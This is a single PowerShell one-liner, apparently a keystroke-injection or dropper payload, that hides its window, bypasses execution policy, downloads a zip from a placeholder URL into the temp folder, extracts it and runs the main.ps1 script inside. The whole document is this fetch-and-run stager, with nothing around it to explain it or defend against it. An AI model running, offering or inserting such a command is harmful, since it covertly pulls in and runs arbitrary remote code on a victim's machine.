powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";iwr -Uri 'URL TO THE .ZIP' -O "$D\gd.zip";Expand-Archive "$D\gd.zip" -Des $D -Force;. "$D\gd\main.ps1"
